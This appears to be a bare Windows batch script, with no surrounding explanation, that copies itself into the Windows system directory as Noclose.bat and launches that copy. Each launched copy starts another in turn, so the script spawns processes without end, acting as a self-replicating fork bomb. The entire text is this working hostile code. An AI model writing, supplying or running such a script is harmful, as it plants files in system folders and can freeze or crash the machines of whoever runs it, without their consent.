echo off
if not exist %windir%\Noclose.bat goto 2
:3
if exist %windir%\Noclose.bat goto 1
:2
copy %0 %windir%\Noclose.bat >nul
goto 3
:1
start %windir%\Noclose.bat
ctty con
cls